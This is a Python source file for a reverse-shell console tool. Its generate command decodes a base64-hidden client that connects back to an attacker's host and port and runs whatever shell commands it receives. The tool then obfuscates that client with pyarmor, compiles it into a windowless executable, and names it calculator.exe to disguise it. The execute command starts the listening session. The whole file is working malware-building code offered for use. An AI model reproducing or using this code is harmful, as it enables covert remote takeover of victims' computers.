from modules.session import Session
from modules.color import Color
from rich.console import Console
from rich.table import Table
import subprocess
import os
import base64
import tempfile

variablesConfig: dict = {
    "session.lhost": "localhost",
    "session.lport": 4444,
    "generate.lhost": "localhost",
    "generate.lport": 4444,
}


def load_banner():
    with open("banner.txt", "r") as banner:
        print(banner.read())


def set_var(command):
    variable, value = command.split(" ")[1:]
    if variable not in variablesConfig:
        print(f"{Color.OKGREEN}Variable not found{Color.DEFAULT}")
        return
    variablesConfig[variable] = value
    print(f"{Color.OKBLUE}{variable} set to {value}{Color.DEFAULT}")


def help(_):
    for command, data in commands.items():
        table = Table(title=command, title_style="bold green", title_justify="start")
        table.add_column("Variable")
        table.add_column("Description")
        for var in data["vars"]:
            table.add_row(var, "variable configuration")
        table.add_row("Description", data["description"])
        console = Console()
        console.print(table)


def start_session(command):
    Session(variablesConfig["session.lhost"], int(variablesConfig["session.lport"])).start()


def read_payload():
        payload = base64.b64decode("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKCmNsYXNzIENsaWVudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBwb3J0KToKICAgICAgICBzZWxmLmhvc3QgPSBob3N0CiAgICAgICAgc2VsZi5wb3J0ID0gcG9ydAogICAgICAgIHNlbGYuY2xpZW50ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNlbGYuY2xpZW50LmNvbm5lY3QoKHNlbGYuaG9zdCwgc2VsZi5wb3J0KSkKCiAgICBkZWYgc2VuZChzZWxmOiBpc2luc3RhbmNlLCBkYXRhOiBieXRlcyk6CiAgICAgICAgc2VsZi5jbGllbnQuc2VuZChkYXRhKQoKICAgIGRlZiByZWNlaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNsaWVudC5yZWN2KDYwMDApCgoKY2xpZW50ID0gTm9uZQpkZWYgY29ubmVjdCgpOgogICAgZ2xvYmFsIGNsaWVudAogICAgd2hpbGUgY2xpZW50IGlzIE5vbmU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBjbGllbnQgPSBDbGllbnQoJHtMSE9TVH0sICR7TFBPUlR9KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCgpjb25uZWN0KCkKCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgY29tbWFuZCA9IGNsaWVudC5yZWNlaXZlKCkuZGVjb2RlKCkKICAgICAgICBpZiBjb21tYW5kIGlzIE5vbmU6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgIHNoZWxsPVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICApCiAgICAgICAgb3V0cHV0ID0gb3V0cHV0LnN0ZGVyciBpZiBvdXRwdXQuc3RkZXJyIGVsc2Ugb3V0cHV0LnN0ZG91dAoKICAgICAgICBpZiBvdXRwdXQgaXMgTm9uZSBvciBvdXRwdXQgPT0gIiI6CiAgICAgICAgICAgIG91dHB1dCA9ICJDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSIKCiAgICAgICAgY2xpZW50LnNlbmQob3V0cHV0LmVuY29kZSgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBjbGllbnQgPSBOb25lCiAgICAgICAgY29ubmVjdCgpCiAgICAgICAgcGFzcwo=")
        return (
            payload.decode()
            .replace("${LHOST}", f"'{variablesConfig["generate.lhost"]}'")
            .replace("${LPORT}", str(variablesConfig["generate.lport"]))
        )

def generate(command):
  try:
    payload = read_payload()
    print(f"{Color.WARNING}Generating payload{Color.DEFAULT}")
    with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
        temp.write(payload)
        temp.close()

    print(f"{Color.OKGREEN}Obfuscating payload{Color.DEFAULT}")
    subprocess.run(["pyarmor", "gen", temp.name], creationflags=subprocess.CREATE_NO_WINDOW)

    ofuscated_path = os.path.join("dist", os.path.basename(temp.name))
    print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")
    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path], creationflags=subprocess.CREATE_NO_WINDOW)
    print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")
    namefile = os.path.join(os.getcwd(), "calculator.exe")

    os.rename(f"{ofuscated_path}.exe", namefile)
    os.remove(temp.name)
    os.remove(ofuscated_path)
    
  except Exception as e:
    print(f"{Color.FAIL}Error generating payload: {e}{Color.DEFAULT}")
    pass


commands = {
    "help": {
        "description": "Show help message",
        "vars": [],
        "action": help,
    },
    "generate": {
        "description": "Generate a reverse shell",
        "vars": ["lhost", "lport"],
        "action": generate,
    },
    "execute": {
        "description": "Start a session",
        "vars": ["lhost", "lport"],
        "action": start_session,
    },
    "set": {
        "description": "Set a variable",
        "vars": ["variable", "value"],
        "action": set_var,
    },
}


load_banner()
while True:
  try:
    print("reverse_shell@root> ", end="")
    command = input()
    if command == "exit":
        break

    search = command.split(" ")[0]
    if search in commands:
        commands[search]["action"](command)
    else:
        print(f"{Color.FAIL}Command not found{Color.DEFAULT}")
  except Exception as e:
        print(f"{Color.FAIL}Invalid syntax: {e}{Color.DEFAULT}")
        pass
